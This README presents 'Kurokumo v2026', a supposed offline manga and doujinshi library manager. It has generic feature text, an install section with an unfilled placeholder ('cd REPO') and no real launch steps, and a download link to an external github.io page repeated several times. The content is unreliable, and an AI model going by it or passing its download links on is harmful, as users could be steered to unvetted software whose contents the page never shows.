# Kurokumo v2026 - offline manga library manager 2026

> **Kurokumo is a desktop web app that organizes local manga and doujinshi archives into an offline-first searchable library, with metadata enrichment and privacy-focused access.**

[![Platform](https://img.shields.io/badge/Platform-desktop%20web%20app-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lewisryan1988/kurokumo-offline-archive-hub?style=flat-square)](https://github.com/lewisryan1988/kurokumo-offline-archive-hub)

---

<p align="center">
  <a href="https://lewisryan1988.github.io/kurokumo-offline-archive-hub/">
    <img src="https://img.shields.io/badge/Download-Kurokumo%20Latest-brightgreen?style=for-the-badge" alt="Download Kurokumo">
  </a>
</p>

> **[Download Latest Build - Kurokumo v2026](https://lewisryan1988.github.io/kurokumo-offline-archive-hub/)**

---

[Download Latest Build](https://lewisryan1988.github.io/kurokumo-offline-archive-hub/)

---

## Overview

Kurokumo is built to take a local stash of manga and doujinshi and turn it into a cleaner, easier-to-navigate library. It keeps the experience centered on offline-first usage, so your collection remains available without relying on outside services.

This app is aimed at people who store their archives on local drives and want a better way to manage titles, tags, and metadata. By combining folder scanning, catalog indexing, and thumbnail-based browsing, it makes large collections much more manageable to inspect and maintain.

---

## What it offers

- Scans local folders that already contain manga and doujinshi archives
- Provides a full-text searchable catalog for quicker retrieval
- Enriches metadata to help keep the library organized
- Supports multilingual titles and tags for wider collection coverage
- Uses thumbnails for visual browsing and navigation
- Works offline for local-only access
- Includes export and backup tools for portability
- Avoids telemetry for a more private workflow

---

## Installation

1. Download or clone the repository into a local folder.
2. Open the app from the project directory or launch the built web interface in your desktop environment.
3. Point Kurokumo at the directory that contains your archive files.
4. Let the initial scan finish so the catalog can be indexed.

Example:

    git clone https://github.com/lewisryan1988/kurokumo-offline-archive-hub.git
    cd REPO

Then start the app using the project’s normal launch method for your build or environment.

---

## How to use it

Once the initial scan is complete, you can explore the library through the catalog view and search for titles, tags, or other indexed fields. Thumbnail previews help you move through large archives without opening every file one by one.

Typical workflow:

1. Add or select a local folder.
2. Run a scan to build the library index.
3. Review metadata and title mappings.
4. Search the catalog by text, tag, or language.
5. Export or back up the library data when needed.

---

## Configuration

Most options are handled in the app itself and are connected to the local library source you choose. Common settings include scan paths, metadata handling, and display preferences.

Example configuration layout:

    {
      "libraryPath": "/path/to/your/archive",
      "offlineMode": true,
      "thumbnailView": true,
      "metadataSync": "local"
    }

If your build stores settings elsewhere, check the application data directory or the project configuration files in the repository.

---

## Requirements

- Desktop environment with a modern web runtime or browser-based app host
- Local storage space for the archive, generated index, thumbnails, and backups
- Access to the folders you want to scan
- Enough memory and CPU for catalog indexing on larger collections

---

## FAQ

**How do I update the library?**  
Run a rescan or point Kurokumo at the same folder again after your local archive changes.

**Can I use it without an internet connection?**  
Yes. The workflow is designed around offline access to local files and indexes.

**Where are settings stored?**  
Settings are typically saved in the app data area or alongside the local configuration used by your build.

**What if search results are incomplete?**  
Start a new scan and make sure the source folder still contains the files you expect to be indexed.

**How do I back up my data?**  
Use the export and backup features to save library state, metadata, or related configuration before moving systems.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
